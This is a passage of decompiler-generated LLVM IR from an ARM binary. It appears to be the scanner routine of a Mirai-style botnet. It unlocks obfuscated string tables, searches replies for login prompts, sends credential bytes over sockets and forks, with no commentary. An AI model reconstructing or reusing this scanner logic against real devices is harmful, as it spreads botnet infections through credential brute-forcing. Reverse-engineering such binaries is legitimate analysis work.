  br i1 %v8_f7ec, label %dec_label_pc_f930, label %dec_label_pc_f7f4

dec_label_pc_f7f4:                                ; preds = %bb452
  %v2_f7f4 = icmp ugt i8 %v3_f7e4, 35
  store i1 %v2_f7f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7f4 = icmp eq i8 %v3_f7e4, 36
  store i1 %v7_f7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f4, label %dec_label_pc_f930, label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f7f4
  %v2_f7fc = icmp ugt i8 %v3_f7e4, 34
  store i1 %v2_f7fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7fc = icmp eq i8 %v3_f7e4, 35
  store i1 %v7_f7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7fc, label %dec_label_pc_f930, label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %dec_label_pc_f7fc
  %v2_f804 = icmp ugt i8 %v3_f7e4, 36
  store i1 %v2_f804, i1* %cpsr_c.global-to-local, align 1
  %v7_f804 = icmp eq i8 %v3_f7e4, 37
  store i1 %v7_f804, i1* %cpsr_z.global-to-local, align 1
  %v1_f808 = add i32 %v0_f808, -1
  store i32 %v1_f808, i32* %r3.global-to-local, align 4
  br i1 %v7_f804, label %dec_label_pc_f930, label %dec_label_pc_f810

dec_label_pc_f810:                                ; preds = %dec_label_pc_f810.preheader, %dec_label_pc_f804
  %v0_f808 = phi i32 [ %v2_f7d8, %dec_label_pc_f810.preheader ], [ %v1_f808, %dec_label_pc_f804 ]
  %v0_f810 = phi i32 [ %v1_f7a0, %dec_label_pc_f810.preheader ], [ %v1_f810, %dec_label_pc_f804 ]
  %v1_f810 = add i32 %v0_f810, -1
  store i32 %v1_f810, i32* %r1.global-to-local, align 4
  %v2_f810 = icmp ne i32 %v0_f810, 0
  store i1 %v2_f810, i1* %cpsr_c.global-to-local, align 1
  %v7_f810 = icmp eq i32 %v0_f810, 1
  store i1 %v7_f810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f810, label %dec_label_pc_f818, label %dec_label_pc_f7e4

dec_label_pc_f818:                                ; preds = %dec_label_pc_f810, %dec_label_pc_f79c
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f81c = call i32 @table_unlock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f824 = call i32 @table_unlock_val(i32 30)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_f834 = call i32 @table_retrieve_val(i32 29, i32* nonnull %stack_var_-60)
  store i32 %v3_f834, i32* @r4, align 4
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_f848 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_f84c = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f848, 16777216
  %v1_f850 = sdiv i32 %sext, 16777216
  store i32 %v1_f850, i32* @r5, align 4
  %v0_f854 = load i32, i32* @r4, align 4
  store i32 %v0_f854, i32* %r2.global-to-local, align 4
  %v1_f858 = add i32 %v3_f84c, -1
  store i32 %v1_f858, i32* %r3.global-to-local, align 4
  %v0_f85c = load i32, i32* @sb, align 4
  store i32 %v0_f85c, i32* %r0.global-to-local, align 4
  %v0_f860 = load i32, i32* @r6, align 4
  %v1_f860 = add i32 %v0_f860, 24
  %v2_f860 = inttoptr i32 %v1_f860 to i32*
  %v3_f860 = load i32, i32* %v2_f860, align 4
  store i32 %v3_f860, i32* %r1.global-to-local, align 4
  %v4_f864 = call i32 @util_memsearch(i32 %v0_f85c, i32 %v3_f860, i32 %v0_f854, i32 %v1_f858)
  store i32 %v4_f864, i32* %r0.global-to-local, align 4
  %v2_f868 = icmp eq i32 %v4_f864, -1
  store i1 %v2_f868, i1* %cpsr_c.global-to-local, align 1
  %v7_f868 = icmp eq i32 %v4_f864, -1
  store i1 %v7_f868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f868, label %dec_label_pc_f878, label %dec_label_pc_f8a0

dec_label_pc_f878:                                ; preds = %dec_label_pc_f818
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f878 = load i32, i32* %stack_var_-60, align 4
  %v0_f87c = load i32, i32* @r5, align 4
  store i32 %v0_f87c, i32* %r2.global-to-local, align 4
  %v1_f880 = add i32 %v3_f878, -1
  store i32 %v1_f880, i32* %r3.global-to-local, align 4
  %v0_f884 = load i32, i32* @sb, align 4
  store i32 %v0_f884, i32* %r0.global-to-local, align 4
  %v0_f888 = load i32, i32* @r6, align 4
  %v1_f888 = add i32 %v0_f888, 24
  %v2_f888 = inttoptr i32 %v1_f888 to i32*
  %v3_f888 = load i32, i32* %v2_f888, align 4
  store i32 %v3_f888, i32* %r1.global-to-local, align 4
  %v4_f88c = call i32 @util_memsearch(i32 %v0_f884, i32 %v3_f888, i32 %v0_f87c, i32 %v1_f880)
  store i32 %v4_f88c, i32* %r0.global-to-local, align 4
  %v1_f890 = add i32 %v4_f88c, 1
  store i32 %v1_f890, i32* @r7, align 4
  %v2_f890 = icmp eq i32 %v4_f88c, -1
  store i1 %v2_f890, i1* %cpsr_c.global-to-local, align 1
  %v7_f890 = icmp eq i32 %v1_f890, 0
  store i1 %v7_f890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f890, label %dec_label_pc_fb54, label %dec_label_pc_f8a0

dec_label_pc_f8a0:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f818
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f8a4 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f8ac = call i32 @table_lock_val(i32 30)
  store i32 %v1_f8ac, i32* %r0.global-to-local, align 4
  %v0_f8b0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8b0 = icmp eq i32 %v0_f8b0, 0
  store i1 %v2_f8b0, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f8b0, 1
  br i1 %tmp453, label %dec_label_pc_f790, label %dec_label_pc_f944

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f328
  store i32 %v2_f8c0, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1932c.207 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f8c0, i32* @r0, align 4
  store i32 %v2_f8d4, i32* @sl, align 4
  %v0_f8d8 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f8d4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19323.209 to i32), i32* @r1, align 4
  %v0_f8e8 = call i32 @memcpy()
  store i32 %v0_f8e8, i32* %r0.global-to-local, align 4
  %v0_f8ec = load i32, i32* @r6, align 4
  %v1_f8ec = add i32 %v0_f8ec, 24
  %v2_f8ec = inttoptr i32 %v1_f8ec to i32*
  %v3_f8ec = load i32, i32* %v2_f8ec, align 4
  %v0_f8f0 = load i32, i32* @r4, align 4
  %v1_f8f0 = add i32 %v0_f8f0, 2
  store i32 %v1_f8f0, i32* %r2.global-to-local, align 4
  %v0_f8f4 = load i32, i32* @sb, align 4
  %v2_f8f4 = add i32 %v0_f8f4, %v3_f8ec
  store i32 %v2_f8f4, i32* @r3, align 4
  %v3_f8f8 = icmp uge i32 %v2_f8f4, %v1_f8f0
  store i1 %v3_f8f8, i1* %cpsr_c.global-to-local, align 1
  %v9_f8f8 = icmp eq i32 %v2_f8f4, %v1_f8f0
  store i1 %v9_f8f8, i1* %cpsr_z.global-to-local, align 1
  %v2_f8fc = xor i1 %v3_f8f8, true
  %v3_f8fc = or i1 %v9_f8f8, %v2_f8fc
  br i1 %v3_f8fc, label %dec_label_pc_f8bc.dec_label_pc_f3a4.loopexit_crit_edge, label %dec_label_pc_f900

dec_label_pc_f8bc.dec_label_pc_f3a4.loopexit_crit_edge: ; preds = %dec_label_pc_f8bc
  %v0_f3a4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f3a4

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8bc
  %v2_f900 = inttoptr i32 %v1_f8f0 to i8*
  %v3_f900 = load i8, i8* %v2_f900, align 1
  %v4_f900 = zext i8 %v3_f900 to i32
  store i32 %v4_f900, i32* %r3.global-to-local, align 4
  %v2_f904 = icmp ugt i8 %v3_f900, 30
  store i1 %v2_f904, i1* %cpsr_c.global-to-local, align 1
  %v7_f904 = icmp eq i8 %v3_f900, 31
  store i1 %v7_f904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f904, label %dec_label_pc_fa34, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f900
  %v1_f90c = inttoptr i32 %v0_f8f0 to i8*
  %v2_f90c = load i8, i8* %v1_f90c, align 1
  %v3_f90c = zext i8 %v2_f90c to i32
  store i32 %v3_f90c, i32* %r3.global-to-local, align 4
  %v2_f910 = icmp ugt i8 %v2_f90c, -4
  store i1 %v2_f910, i1* %cpsr_c.global-to-local, align 1
  %v7_f910 = icmp eq i8 %v2_f90c, -3
  store i1 %v7_f910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f910, label %.thread138, label %dec_label_pc_f920

.thread138:                                       ; preds = %dec_label_pc_f90c
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f90c, align 1
  %v0_f91c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f91c.pr.pr, label %dec_label_pc_f33c, label %.thread138.dec_label_pc_f920thread-pre-split_crit_edge

.thread138.dec_label_pc_f920thread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f920.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f920

dec_label_pc_f920:                                ; preds = %dec_label_pc_f90c, %.thread138.dec_label_pc_f920thread-pre-split_crit_edge
  %v0_f920.pr = phi i32 [ %v0_f920.pr.pre, %.thread138.dec_label_pc_f920thread-pre-split_crit_edge ], [ %v3_f90c, %dec_label_pc_f90c ]
  %v2_f920 = icmp ugt i32 %v0_f920.pr, 250
  store i1 %v2_f920, i1* %cpsr_c.global-to-local, align 1
  %v7_f920 = icmp eq i32 %v0_f920.pr, 251
  store i1 %v7_f920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f920, label %bb454, label %dec_label_pc_f33c

bb454:                                            ; preds = %dec_label_pc_f920
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f928 = load i32, i32* @r4, align 4
  %v4_f928 = inttoptr i32 %v3_f928 to i8*
  store i8 -3, i8* %v4_f928, align 1
  br label %dec_label_pc_f33c

dec_label_pc_f930:                                ; preds = %dec_label_pc_f7e4, %dec_label_pc_f804, %dec_label_pc_f7fc, %dec_label_pc_f7f4, %bb452, %dec_label_pc_f7d0, %dec_label_pc_f7ac, %dec_label_pc_f7c8, %dec_label_pc_f7c0, %bb451
  %v0_f934 = phi i32 [ %v1_f7a0, %dec_label_pc_f7d0 ], [ %v1_f7a0, %dec_label_pc_f7ac ], [ %v1_f7a0, %dec_label_pc_f7c8 ], [ %v1_f7a0, %dec_label_pc_f7c0 ], [ %v1_f7a0, %bb451 ], [ %v1_f810, %bb452 ], [ %v1_f810, %dec_label_pc_f7f4 ], [ %v1_f810, %dec_label_pc_f7fc ], [ %v1_f810, %dec_label_pc_f804 ], [ %v1_f810, %dec_label_pc_f7e4 ]
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f934 = add i32 %v0_f934, 1
  store i32 %v1_f934, i32* @r7, align 4
  %v1_f938 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f940 = call i32 @table_lock_val(i32 30)
  store i32 %v1_f940, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f944

dec_label_pc_f944:                                ; preds = %dec_label_pc_f8a0, %dec_label_pc_f930
  %v0_f944 = load i32, i32* @r6, align 4
  %v1_f944 = inttoptr i32 %v0_f944 to i32*
  %v2_f944 = load i32, i32* %v1_f944, align 4
  store i32 %v2_f944, i32* %r3.global-to-local, align 4
  %v1_f948 = add i32 %v0_f944, 4
  %v2_f948 = inttoptr i32 %v1_f948 to i32*
  %v3_f948 = load i32, i32* %v2_f948, align 4
  store i32 %v3_f948, i32* %r0.global-to-local, align 4
  %v1_f94c = add i32 %v2_f944, 12
  %v2_f94c = inttoptr i32 %v1_f94c to i8*
  %v3_f94c = load i8, i8* %v2_f94c, align 1
  %v4_f94c = zext i8 %v3_f94c to i32
  store i32 %v4_f94c, i32* %r2.global-to-local, align 4
  %v1_f950 = inttoptr i32 %v2_f944 to i32*
  %v2_f950 = load i32, i32* %v1_f950, align 4
  store i32 %v2_f950, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f958 = call i32 @__libc_send(i32 %v3_f948, i32 %v2_f950, i32 %v4_f94c, i32 16384)
  store i32 %v4_f958, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f960 = load i32, i32* @r6, align 4
  %v1_f960 = add i32 %v0_f960, 4
  %v2_f960 = inttoptr i32 %v1_f960 to i32*
  %v3_f960 = load i32, i32* %v2_f960, align 4
  store i32 %v3_f960, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f96c = call i32 @__libc_send(i32 %v3_f960, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 %v4_f96c, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f974 = load i32, i32* @r6, align 4
  %v2_f974 = add i32 %v1_f974, 12
  %v3_f974 = inttoptr i32 %v2_f974 to i32*
  store i32 4, i32* %v3_f974, align 4
  br label %dec_label_pc_f790

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f6e8, %dec_label_pc_f700, %dec_label_pc_f6f8, %bb448, %dec_label_pc_f6d4, %dec_label_pc_f6b8, %dec_label_pc_f6cc, %bb447
  %v0_f980 = phi i32 [ %v1_f6ac, %dec_label_pc_f6d4 ], [ %v1_f6ac, %dec_label_pc_f6b8 ], [ %v1_f6ac, %dec_label_pc_f6cc ], [ %v1_f6ac, %bb447 ], [ %v1_f70c, %bb448 ], [ %v1_f70c, %dec_label_pc_f6f8 ], [ %v1_f70c, %dec_label_pc_f700 ], [ %v1_f70c, %dec_label_pc_f6e8 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f980 = add i32 %v0_f980, 1
  store i32 %v1_f980, i32* @r7, align 4
  %v1_f984 = call i32 @table_lock_val(i32 28)
  br label %dec_label_pc_f75c

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f098
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f998 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_f9a8 = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  store i32 %v3_f9a8, i32* %r0.global-to-local, align 4
  %v3_f9ac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f9a8, i32* %r2.global-to-local, align 4
  %v1_f9b4 = add i32 %v3_f9ac, -1
  store i32 %v1_f9b4, i32* %r3.global-to-local, align 4
  %v0_f9b8 = load i32, i32* @r6, align 4
  %v1_f9b8 = add i32 %v0_f9b8, 24
  %v2_f9b8 = inttoptr i32 %v1_f9b8 to i32*
  %v3_f9b8 = load i32, i32* %v2_f9b8, align 4
  store i32 %v3_f9b8, i32* %r1.global-to-local, align 4
  %v0_f9bc = load i32, i32* @sb, align 4
  store i32 %v0_f9bc, i32* %r0.global-to-local, align 4
  %v4_f9c0 = call i32 @util_memsearch(i32 %v0_f9bc, i32 %v3_f9b8, i32 %v3_f9a8, i32 %v1_f9b4)
  store i32 %v4_f9c0, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f9cc = call i32 @table_lock_val(i32 11)
  store i32 %v1_f9cc, i32* %r0.global-to-local, align 4
  %v0_f9d0 = load i32, i32* @r7, align 4
  %v2_f9d0 = icmp eq i32 %v0_f9d0, -1
  store i1 %v2_f9d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d0 = icmp eq i32 %v0_f9d0, -1
  store i1 %v7_f9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9d0, label %dec_label_pc_ef78.loopexit, label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f98c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9d8 = icmp eq i32 %v0_f9d0, 0
  store i1 %v2_f9d8, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f9d0, 1
  br i1 %tmp455, label %dec_label_pc_f790, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9d8
  %v0_f9e0 = load i32, i32* @r6, align 4
  %v1_f9e0 = add i32 %v0_f9e0, 20
  %v2_f9e0 = inttoptr i32 %v1_f9e0 to i16*
  %v3_f9e0 = load i16, i16* %v2_f9e0, align 2
  %v4_f9e0 = zext i16 %v3_f9e0 to i32
  store i32 %v4_f9e0, i32* %r3.global-to-local, align 4
  %v1_f9e4 = add i32 %v0_f9e0, 16
  %v2_f9e4 = inttoptr i32 %v1_f9e4 to i32*
  %v3_f9e4 = load i32, i32* %v2_f9e4, align 4
  store i32 %v3_f9e4, i32* %r2.global-to-local, align 4
  store i32 %v2_f9e8, i32* %ip.global-to-local, align 4
  store i32 %v4_f9e0, i32* %stack_var_-42, align 4
  store i32 %v3_f9e4, i32* %stack_var_-60, align 4
  %v1_f9f4 = inttoptr i32 %v0_f9e0 to i32*
  %v2_f9f4 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_f9f4, i32* @r8, align 4
  %v0_f9f8 = call i32 @__libc_fork()
  store i32 %v0_f9f8, i32* %r0.global-to-local, align 4
  %v7_f9fc = icmp eq i32 %v0_f9f8, -1
  %.465 = zext i1 %v7_f9fc to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa08 = icmp eq i32 %v0_f9f8, 0
  store i1 %v2_fa08, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f9f8, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f9e0
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa1c

bb459:                                            ; preds = %dec_label_pc_f9e0
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa14 = icmp eq i1 %v7_f9fc, false
  store i1 %v2_fa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa14, label %dec_label_pc_fba4, label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %.thread144, %bb459
  %v0_fa1c = load i32, i32* @r6, align 4
  %v1_fa1c = add i32 %v0_fa1c, 4
  %v2_fa1c = inttoptr i32 %v1_fa1c to i32*
  %v3_fa1c = load i32, i32* %v2_fa1c, align 4
  store i32 %v3_fa1c, i32* %r0.global-to-local, align 4
  %v1_fa20 = call i32 @__GI___libc_close(i32 %v3_fa1c)
  store i32 %v1_fa20, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_fa28 = load i32, i32* @r4, align 4
  %v1_fa28 = load i32, i32* @r6, align 4
  %v2_fa28 = add i32 %v1_fa28, 4
  %v3_fa28 = inttoptr i32 %v2_fa28 to i32*
  store i32 %v0_fa28, i32* %v3_fa28, align 4
  %v0_fa2c = load i32, i32* @r3, align 4
  %v1_fa2c = load i32, i32* @r6, align 4
  %v2_fa2c = add i32 %v1_fa2c, 12
  %v3_fa2c = inttoptr i32 %v2_fa2c to i32*
  store i32 %v0_fa2c, i32* %v3_fa2c, align 4
  br label %dec_label_pc_f790

dec_label_pc_fa34:                                ; preds = %dec_label_pc_f900
  store i32 %v2_f8c0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_fa40 = add i32 %v0_f8ec, 4
  %v2_fa40 = inttoptr i32 %v1_fa40 to i32*
  %v3_fa40 = load i32, i32* %v2_fa40, align 4
  store i32 %v3_fa40, i32* %r0.global-to-local, align 4
  %v4_fa44 = call i32 @__libc_send(i32 %v3_fa40, i32 %v2_f8c0, i32 3, i32 16384)
  store i32 %v4_fa44, i32* %r0.global-to-local, align 4
  %v0_fa48 = load i32, i32* @r6, align 4
  %v1_fa48 = add i32 %v0_fa48, 4
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  store i32 %v3_fa48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f388

dec_label_pc_fa58:                                ; preds = %dec_label_pc_ef84
  store i32 %.pre282, i32* @r0, align 4
  %v1_fa60 = add i32 %v0_fa58, 92
  store i32 %v1_fa60, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa68 = call i32 @memmove(i32 %.pre282, i32 %v1_fa60, i32 192)
  store i32 %v3_fa68, i32* %r0.global-to-local, align 4
  %v0_fa6c = load i32, i32* @r6, align 4
  %v1_fa6c = add i32 %v0_fa6c, 24
  %v2_fa6c = inttoptr i32 %v1_fa6c to i32*
  %v3_fa6c = load i32, i32* %v2_fa6c, align 4
  %v1_fa70 = add i32 %v3_fa6c, -64
  store i32 %v1_fa70, i32* %r3.global-to-local, align 4
  store i32 %v1_fa70, i32* %v2_fa6c, align 4
  br label %dec_label_pc_ef94

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_f0d4
  %v0_fa7c = load i32, i32* @r6, align 4
  store i32 %v0_fa7c, i32* @r0, align 4
  %v0_fa80 = call i32 @setup_connection()
  store i32 %v0_fa80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f110

dec_label_pc_fa88:                                ; preds = %dec_label_pc_ef3c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e6ac, i32* %r3.global-to-local, align 4
  store i32 %v2_f82c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_fab0 = call i32 @getsockopt(i32 %v3_ef30, i32 1, i32 4, i32 %v2_e6ac, i32 %v2_f82c)
  %v3_fab4 = load i8, i8* %stack_var_-56, align 1
  %v4_fab4 = sext i8 %v3_fab4 to i32
  store i32 %v4_fab4, i32* %r3.global-to-local, align 4
  %v2_fab8 = or i32 %v4_fab4, %v5_fab0
  store i32 %v2_fab8, i32* %r0.global-to-local, align 4
  %v4_fab8 = icmp eq i32 %v2_fab8, 0
  store i1 %v4_fab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fab8, label %dec_label_pc_fac0, label %dec_label_pc_fb6c

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fa88
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fac4 = load i32, i32* @r6, align 4
  %v2_fac4 = add i32 %v1_fac4, 12
  %v3_fac4 = inttoptr i32 %v2_fac4 to i32*
  store i32 2, i32* %v3_fac4, align 4
  %v0_fac8 = call i32 @rand_next()
  %v2_fad0 = load i16, i16* bitcast (i16** @global_var_21c60.145 to i16*), align 4
  %v3_fad0 = zext i16 %v2_fad0 to i32
  %v2_fad4 = udiv i32 %v0_fac8, %v3_fad0
  %v3_fad4 = urem i32 %v0_fac8, %v3_fad0
  store i32 %v2_fad4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c30.141 to i32), i32* %r3.global-to-local, align 4
  %v2_fadc = load i32, i32* @global_var_21c30.141, align 4
  store i32 %v2_fadc, i32* %ip.global-to-local, align 4
  %v1_fae4 = load i32, i32* @r4, align 4
  %v9_fae4 = icmp eq i32 %v2_fadc, %v1_fae4
  store i1 %v9_fae4, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_fad4, i32* %r1.global-to-local, align 4
  %v7_faec = icmp sgt i32 %v2_fadc, %v1_fae4
  br i1 %v7_faec, label %dec_label_pc_faf0, label %dec_label_pc_fb30

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fac0
  %v2_faf4 = load i32, i32* @global_var_21c5c.143, align 4
  store i32 %v2_faf4, i32* %r3.global-to-local, align 4
  store i32 %v1_fae4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fb10

dec_label_pc_fb00:                                ; preds = %dec_label_pc_fb20, %dec_label_pc_fb10
  %v1_fb00 = add i32 %v0_fb00, 1
  store i32 %v1_fb00, i32* %r2.global-to-local, align 4
  %v9_fb04 = icmp eq i32 %v1_fb00, %v2_fadc
  %v1_fb08 = add i32 %v0_fb08, 16
  store i32 %v1_fb08, i32* %r3.global-to-local, align 4
  br i1 %v9_fb04, label %dec_label_pc_fb30.loopexit, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_fb00, %dec_label_pc_faf0
  %v0_fb00 = phi i32 [ %v1_fb00, %dec_label_pc_fb00 ], [ %v1_fae4, %dec_label_pc_faf0 ]
  %v0_fb08 = phi i32 [ %v1_fb08, %dec_label_pc_fb00 ], [ %v2_faf4, %dec_label_pc_faf0 ]
  store i32 %v0_fb08, i32* %r0.global-to-local, align 4
  %v1_fb14 = add i32 %v0_fb08, 8
  %v2_fb14 = inttoptr i32 %v1_fb14 to i16*
  %v3_fb14 = load i16, i16* %v2_fb14, align 2
  %v4_fb14 = zext i16 %v3_fb14 to i32
  store i32 %v4_fb14, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_fb14, %v3_fad4
  br i1 %tmp460, label %dec_label_pc_fb00, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb10
  %v1_fb20 = add i32 %v0_fb08, 10
  %v2_fb20 = inttoptr i32 %v1_fb20 to i16*
  %v3_fb20 = load i16, i16* %v2_fb20, align 2
  %v4_fb20 = zext i16 %v3_fb20 to i32
  store i32 %v4_fb20, i32* %r3.global-to-local, align 4
  %v3_fb24 = icmp uge i32 %v4_fb20, %v3_fad4
  %v9_fb24 = icmp eq i32 %v4_fb20, %v3_fad4
  %v2_fb28 = xor i1 %v3_fb24, true
  %v3_fb28 = or i1 %v9_fb24, %v2_fb28
  br i1 %v3_fb28, label %dec_label_pc_fb00, label %dec_label_pc_fb34.loopexit

dec_label_pc_fb30.loopexit:                       ; preds = %dec_label_pc_fb00
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb30.loopexit, %dec_label_pc_fac0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb34

dec_label_pc_fb34.loopexit:                       ; preds = %dec_label_pc_fb20
  store i1 %v3_fb24, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb34

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb34.loopexit, %dec_label_pc_fb30
  %v0_fb48 = phi i32 [ %v0_fb08, %dec_label_pc_fb34.loopexit ], [ 0, %dec_label_pc_fb30 ]
  %v0_fb34 = load i32, i32* @r6, align 4
  %v1_fb34 = add i32 %v0_fb34, 4
  %v2_fb34 = inttoptr i32 %v1_fb34 to i32*
  %v3_fb34 = load i32, i32* %v2_fb34, align 4
  %v3_fb38 = udiv i32 %v3_fb34, 32
  store i32 %v3_fb38, i32* %r2.global-to-local, align 4
  %v1_fb3c = urem i32 %v3_fb34, 32
  store i32 %v1_fb3c, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fb40 = mul nuw nsw i32 %v3_fb38, 4
  store i32 %v3_fb40, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fb48 = inttoptr i32 %v0_fb34 to i32*
  store i32 %v0_fb48, i32* %v2_fb48, align 4
  %v0_fb4c = load i32, i32* %r3.global-to-local, align 4
  %v1_fb4c = load i32, i32* @r6, align 4
  %v2_fb4c = add i32 %v1_fb4c, 24
  %v3_fb4c = inttoptr i32 %v2_fb4c to i32*
  store i32 %v0_fb4c, i32* %v3_fb4c, align 4
  %v0_ef64.pre = load i32, i32* @ip, align 4
  %v1_ef6c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef60

dec_label_pc_fb54:                                ; preds = %dec_label_pc_f878
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_fb58 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_fb60 = call i32 @table_lock_val(i32 30)
  store i32 %v1_fb60, i32* %r0.global-to-local, align 4
